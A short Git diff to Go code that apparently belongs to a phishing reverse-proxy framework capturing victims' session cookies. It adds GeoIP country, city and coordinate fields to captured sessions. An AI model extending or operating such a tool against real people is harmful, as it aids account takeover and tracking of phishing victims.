@@ -31,6 +31,11 @@ type Session struct {
 	UserAgent      string
 	Cmsgid         string
 	Tmsgid         string
+	// GeoIP fields — populated on session creation if GeoIP database is loaded
+	GeoCountry string  `json:"geo_country"`
+	GeoCity    string  `json:"geo_city"`
+	GeoLat     float64 `json:"geo_lat"`
+	GeoLon     float64 `json:"geo_lon"`
 }
 
 func NewSession(name string) (*Session, error) {
@@ -58,6 +63,11 @@ func NewSession(name string) (*Session, error) {
 		UserAgent:      "",
 		Cmsgid:         "",
 		Tmsgid:         "",
+		// GeoIP fields initialized to zero values
+		GeoCountry: "",
+		GeoCity:    "",
+		GeoLat:     0.0,
+		GeoLon:     0.0,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -101,7 +111,6 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 			HttpOnly: http_only,
 		}
 	}
-
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
